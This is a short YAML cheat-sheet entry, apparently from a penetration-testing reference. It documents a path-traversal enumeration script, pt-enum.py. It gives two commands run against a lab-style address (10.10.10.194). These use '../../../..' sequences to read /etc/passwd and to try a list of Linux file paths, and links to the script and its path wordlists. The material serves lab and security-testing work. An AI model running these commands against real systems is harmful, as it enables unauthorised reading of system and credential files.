---
functions:
  enumeration:
    - description: Use a script to automatically exploit a path traversal vulnerability
                   and output results
      code: |
        pt-enum.py --base-url "http://10.10.10.194/news.php?file=" --path "../../../.." --file "/etc/passwd"
        pt-enum.py --base-url "http://10.10.10.194/news.php?file=" --path "../../../.." --list /home/unknown/Documents/Scripts/path-traversal/linux

resources: |
  https://raw.githubusercontent.com/MidnightSeer/scripts/master/pt-enum.py
  https://raw.githubusercontent.com/MidnightSeer/scripts/master/path_traversal_linux
  https://raw.githubusercontent.com/MidnightSeer/scripts/master/path_traversal_windows
---
